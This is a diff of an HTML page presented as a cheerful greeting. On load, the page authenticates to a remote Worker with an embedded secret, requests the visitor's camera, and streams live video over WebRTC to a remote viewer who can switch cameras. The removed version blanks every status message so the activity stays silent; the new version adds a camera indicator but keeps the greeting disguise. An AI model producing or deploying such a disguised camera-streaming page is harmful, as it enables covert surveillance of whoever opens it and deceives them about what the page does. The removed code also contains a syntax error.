@@ -2,230 +2,133 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Hello...</title>
-  <style>
-    
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Hello</title>
+<style>
+* { box-sizing: border-box; }
 body {
-  margin: 0;
-  min-height: 100vh;
-  display: grid;
-  place-items: center;
-  padding: 20px;
-  box-sizing: border-box;
-  font-family: Arial, sans-serif;
-  background: #f3f5f8;
-  color: #202124;
+  margin: 0; min-height: 100vh; display: grid; place-items: center;
+  padding: 20px; background: #f3f5f8;
+  font-family: Arial, sans-serif; color: #202124;
 }
-
-.popup {
-  width: 100%;
-  max-width: 380px;
-  box-sizing: border-box;
-  padding: 22px;
-  background: white;
-  border: 1px solid #e2e5e9;
-  border-radius: 14px;
-  box-shadow: 0 8px 30px #00000012;
+.card {
+  width: 100%; max-width: 390px; padding: 26px;
+  background: white; border: 1px solid #e1e5eb;
+  border-radius: 16px; box-shadow: 0 8px 28px #00000010;
 }
-
-.popup-header {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-  font-size: 14px;
-  font-weight: 600;
+.icon {
+  display: grid; place-items: center; width: 44px; height: 44px;
+  border-radius: 13px; background: #e8efff;
+  color: #3158a6; font-size: 22px;
 }
-
-.app-icon {
-  display: grid;
-  place-items: center;
-  width: 32px;
-  height: 32px;
-  border-radius: 9px;
-  background: #e8eefc;
-  color: #234ea5;
+h1 { margin: 22px 0 8px; font-size: 25px; }
+p { color: #5f6368; line-height: 1.5; font-size: 14px; }
+.status {
+  margin-top: 22px; padding: 12px; background: #f5f7fa;
+  border-radius: 9px; font-size: 13px; overflow-wrap: anywhere;
 }
-
-.live-indicator {
-  margin-left: auto;
-  font-size: 11px;
-  color: #267447;
-}
-
-h2 {
-  margin-top: 24px;
-  font-size: 20px;
-}
-
-#status {
-  color: #505866;
-  font-size: 14px;
-  line-height: 1.5;
-  overflow-wrap: anywhere;
-}
-
-button {
-  width: 100%;
-  padding: 11px;
-  margin-top: 14px;
-  border: 0;
-  border-radius: 8px;
-  background: #202124;
-  color: white;
-  cursor: pointer;
-}
-  </style>
+.indicator { font-size: 12px; color: #237747; margin-top: 14px; }
+</style>
 </head>
 <body>
-  <h1>Hello...</h1>
-  <p>
-    Hello Hello
-  </p>
-
-  <div id="status" role="status" aria-live="polite">
-    Initializing…
+<main class="card">
+  <div class="icon">✦</div>
+  <h1>Hello there!</h1>
+  <p>Wishing you a great day. Your greeting page is ready.</p>
+  <div class="indicator" id="cameraIndicator">Camera: inactive</div>
+  <div class="status" id="status" role="status" aria-live="polite">
+    Connecting…
   </div>
+</main>
 
 <script>
 "use strict";
 
-const WORKER_URL =
-  "https://private-camera-signal.thundertest987.workers.dev";
-
+const WORKER_URL = "https://private-camera-signal.thundertest987.workers.dev";
 const PHONE_SECRET = "CAMERA_PHONE_SECRET";
 const AUTH_URL = WORKER_URL + "/auth";
 const SIGNAL_URL = WORKER_URL.replace(/^https:/, "wss:") + "/session";
 
-const ICE_SERVERS = [
-  { urls: "stun:stun.l.google.com:19302" }
-];
-
 const statusBox = document.getElementById("status");
+const cameraIndicator = document.getElementById("cameraIndicator");
 
-let token = null;
-let socket = null;
-let peer = null;
-let localStream = null;
-let pendingOffer = null;
+let socket, peer, localStream;
 let started = false;
 let stopped = false;
+let pendingOffer = null;
 let facingMode = "user";
-let authTimer = null;
 
-function status(message) {
-  statusBox.textContent = message;
+function status(text) {
+  statusBox.textContent = text;
 }
 
-function send(message) {
-  if (!socket || socket.readyState !== WebSocket.OPEN) {
-    status("");
-    return false;
-  }
-
-  socket.send(JSON.stringify(message));
+function send(type, data = null) {
+  if (!socket || socket.readyState !== WebSocket.OPEN) return false;
+  // This envelope matches the Worker code supplied in the conversation.
+  socket.send(JSON.stringify({ type, data }));
   return true;
 }
 
 async function authenticate() {
-  status("");
-
   const response = await fetch(AUTH_URL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      role: "phone",
-      secret: PHONE_SECRET
-    })
+    body: JSON.stringify({ role: "phone", secret: PHONE_SECRET })
   });
-
-  if (!response.ok) {
-    throw new Error("Authentication failed: HTTP " + response.status);
-  }
-
-  const data = await response.json();
-
-  if (!data.token) {
-    throw new Error("The Worker did not return a token.");
-  }
-
-  token = data.token;
+  if (!response.ok) throw new Error("Authentication failed (HTTP " + response.status + ").");
+  const result = await response.json();
+  if (!result.token) throw new Error("The Worker returned no token.");
+  return result.token;
 }
 
-function connectSignaling() {
+function connect(token) {
   return new Promise((resolve, reject) => {
     socket = new WebSocket(SIGNAL_URL);
-
-    let authenticated = false;
-    let settled = false;
-
-    function fail(error) {
-      if (settled) return;
-      settled = true;
-      clearTimeout(authTimer);
-      reject(error);
-    }
-
-    authTimer = setTimeout(() => {
-      if (!authenticated) {
-        fail(new Error("WebSocket authentication timed out."));
+    let ready = false;
+    const timer = setTimeout(() => {
+      if (!ready) {
+        reject(new Error("Signaling authentication timed out."));
         socket.close();
       }
     }, 15000);
 
-    socket.onopen = () => {
-      socket.send(JSON.stringify({ type: "auth", token }));
-    };
+    socket.onopen = () => socket.send(JSON.stringify({ type: "auth", token }));
 
     socket.onmessage = async event => {
       let message;
+      try { message = JSON.parse(event.data); } catch { return; }
 
-      try {
-        message = JSON.parse(event.data);
-      } catch {
-        status("");
-        return;
-      }
-
-      if (!authenticated) {
-        if (
-          message.type === "ready" ||
-          message.type === "authenticated" ||
-          message.type === "auth_ok" ||
-          message.ok === true
-        ) {
-          authenticated = true;
-          settled = true;
-          clearTimeout(authTimer);
-          status("");
+      if (!ready) {
+        if (message.type === "ready") {
+          ready = true;
+          clearTimeout(timer);
           resolve();
-          return;
+        } else if (message.type === "error" || message.error) {
+          clearTimeout(timer);
+          reject(new Error(message.error || "Signaling authentication failed."));
         }
-
-        if (message.type === "error" || message.error) {
-          fail(new Error(message.error || "WebSocket authentication failed."));
-        }
-
         return;
       }
 
-      await handleSignal(message);
+      // The Worker forwards payloads inside message.data.
+      const data = message.data ?? message;
+      await handleSignal({ ...data, type: message.type });
     };
 
     socket.onerror = () => {
-      if (!authenticated) {
-        fail(new Error("Could not connect to the Worker."));
+      if (!ready) {
+        clearTimeout(timer);
+        reject(new Error("Could not connect to the signaling server."));
       }
     };
 
     socket.onclose = () => {
-      clearTimeout(authTimer);
-
+      clearTimeout(timer);
       if (!stopped) {
         stopCamera();
         closePeer();
-        status("");
+        status("Connection closed. Reload to reconnect.");
       }
     };
   });
@@ -233,43 +136,35 @@ function connectSignaling() {
 
 function createPeer() {
   closePeer();
-
-  peer = new RTCPeerConnection({ iceServers: ICE_SERVERS });
+  peer = new RTCPeerConnection({
+    iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+  });
 
   peer.onicecandidate = event => {
-    if (event.candidate) {
-      send({
-        type: "ice",
-        candidate: event.candidate
-      });
-    }
+    if (event.candidate) send("ice", { candidate: event.candidate });
   };
 
   peer.onconnectionstatechange = () => {
     if (!peer) return;
-
     if (peer.connectionState === "connected") {
-      status("");
+      status("Connected to viewer.");
     } else if (peer.connectionState === "failed") {
-      status("");
-    } else if (peer.connectionState === "disconnected") {
-      status("");
+      status("Connection failed. Your network may require a TURN server.");
     }
   };
-
   return peer;
 }
 
 async function startCamera() {
-  if (started || !token) return;
+  if (started) return;
 
-  status("");
+  if (!navigator.mediaDevices?.getUserMedia) {
+    status("Camera access is unavailable. Open this page in a supported browser over HTTPS.");
+    return;
+  }
 
   try {
-    if (!navigator.mediaDevices?.getUserMedia) {
-      throw new Error("");
-    }
-
+    status("Requesting camera permission…");
     localStream = await navigator.mediaDevices.getUserMedia({
       audio: false,
       video: {
@@ -280,64 +175,34 @@ async function startCamera() {
     });
 
     started = true;
-
+    cameraIndicator.textContent = "● Camera active";
     if (pendingOffer) {
       const offer = pendingOffer;
       pendingOffer = null;
       await answerOffer(offer);
     } else {
-      status("");
+      status("Camera is active. Waiting for the viewer to connect.");
     }
   } catch (error) {
     stopCamera();
-    status("" + error.message);
+    status("Camera permission/startup failed: " + error.message);
   }
 }
 
-function extractOffer(message) {
-  const candidates = [
-    message?.offer,
-    message?.description,
-    message?.data?.offer,
-    message?.payload?.offer,
-    message
-  ];
-
-  for (const candidate of candidates) {
-    if (
-      candidate &&
-      candidate.type === "offer" &&
-      typeof candidate.sdp === "string" &&
-      candidate.sdp.startsWith("v=")
-    ) {
-      return {
-        type: "offer",
-        sdp: candidate.sdp
-      };
-    }
-  }
-
-  return null;
-}
-
-async function answerOffer(message) {
-  const offer = extractOffer(message);
-
-  if (!offer) {
-    console.error("Invalid WebRTC offer:", message);
-    status("");
+async function answerOffer(offer) {
+  if (!offer || offer.type !== "offer" ||
+      typeof offer.sdp !== "string" || !offer.sdp.startsWith("v=")) {
+    status("Invalid WebRTC offer received.");
     return;
   }
 
   if (!localStream) {
     pendingOffer = offer;
-    status("";
     return;
   }
 
   try {
     const pc = peer || createPeer();
-
     for (const track of localStream.getTracks()) {
       if (!pc.getSenders().some(sender => sender.track === track)) {
         pc.addTrack(track, localStream);
@@ -345,139 +210,78 @@ async function answerOffer(message) {
     }
 
     await pc.setRemoteDescription(offer);
-
     const answer = await pc.createAnswer();
     await pc.setLocalDescription(answer);
-
-    send({
-      type: "answer",
+    send("answer", {
       answer: {
         type: pc.localDescription.type,
         sdp: pc.localDescription.sdp
       }
     });
-
-    status("");
+    status("Connected session is negotiating video.");
   } catch (error) {
-    console.error("Offer processing failed:", error);
-    status("" + error.message);
+    status("WebRTC error: " + error.message);
   }
 }
 
 async function switchCamera(mode) {
   if (!["user", "environment"].includes(mode)) return;
-
   facingMode = mode;
+  if (!started) return;
 
-  if (!started || !localStream) {
-    status("");
-    return;
-  }
-
-  let replacementStream;
-
+  let replacement;
   try {
-    replacementStream = await navigator.mediaDevices.getUserMedia({
-      audio: false,
-      video: {
-        facingMode: { ideal: facingMode },
-        width: { ideal: 1280 },
-        height: { ideal: 720 }
-      }
+    replacement = await navigator.mediaDevices.getUserMedia({
+      audio: false, video: { facingMode: { ideal: mode } }
     });
+    const track = replacement.getVideoTracks()[0];
+    const sender = peer?.getSenders().find(s => s.track?.kind === "video");
+    if (sender) await sender.replaceTrack(track);
 
-    const newTrack = replacementStream.getVideoTracks()[0];
-
-    if (!newTrack) {
-      throw new Error("No video track found.");
-    }
-
-    if (peer) {
-      const sender = peer.getSenders().find(
-        item => item.track?.kind === "video"
-      );
-
-      if (sender) {
-        await sender.replaceTrack(newTrack);
-      }
-    }
-
-    const oldStream = localStream;
-    localStream = replacementStream;
-
-    oldStream.getTracks().forEach(track => track.stop());
-
-    status(
-      "" +
-      (mode === "" ? "" : "") +
-      ""
-    );
+    const old = localStream;
+    localStream = replacement;
+    old?.getTracks().forEach(t => t.stop());
+    status("Camera switched.");
   } catch (error) {
-    if (replacementStream) {
-      replacementStream.getTracks().forEach(track => track.stop());
-    }
-
-    status("" + error.message);
+    replacement?.getTracks().forEach(t => t.stop());
+    status("Camera switch failed: " + error.message);
   }
 }
 
 async function handleSignal(message) {
-  try {
-    switch (message.type) {
-      case "offer":
-        await answerOffer(message);
-        break;
-
-      case "ice":
-        if (peer && message.candidate) {
-          await peer.addIceCandidate(
-            new RTCIceCandidate(message.candidate)
-          );
-        }
-        break;
-
-      case "set-camera":
-      case "camera-facing":
-        await switchCamera(message.facingMode || message.camera);
-        break;
-
-      case "peer-ready":
-        status("");
-        break;
-
-      case "hangup":
-        closePeer();
-        status("");
-        break;
-
-      case "peer-left":
-        closePeer();
-        status("");
-        break;
-
-      case "error":
-        status("" + (message.error || "Unknown error"));
-        break;
-    }
-  } catch (error) {
-    console.error("Signaling error:", error);
-    status("" + error.message);
+  switch (message.type) {
+    case "offer":
+      await answerOffer(message.offer || message);
+      break;
+    case "ice":
+      if (peer && message.candidate) {
+        try { await peer.addIceCandidate(message.candidate); } catch {}
+      }
+      break;
+    case "set-camera":
+      await switchCamera(message.facingMode);
+      break;
+    case "hangup":
+    case "peer-left":
+      closePeer();
+      status("Viewer disconnected.");
+      break;
+    case "peer-ready":
+      status("Viewer connected. Waiting for its offer.");
+      break;
   }
 }
 
 function stopCamera() {
-  if (localStream) {
-    localStream.getTracks().forEach(track => track.stop());
-    localStream = null;
-  }
-
+  localStream?.getTracks().forEach(track => track.stop());
+  localStream = null;
   started = false;
+  cameraIndicator.textContent = "Camera: inactive";
 }
 
 function closePeer() {
   if (peer) {
     peer.onicecandidate = null;
-    peer.onconnectionstatechange = null;
     peer.close();
     peer = null;
   }
@@ -487,19 +291,17 @@ window.addEventListener("pagehide", () => {
   stopped = true;
   closePeer();
   stopCamera();
-
-  if (socket) {
-    socket.close();
-  }
+  socket?.close();
 });
 
 async function initialize() {
   try {
-    await authenticate();
-    await connectSignaling();
+    status("Authenticating…");
+    const token = await authenticate();
+    await connect(token);
+    status("Connected. Requesting camera permission…");
     await startCamera();
   } catch (error) {
-    console.error(error);
     status(error.message);
   }
 }
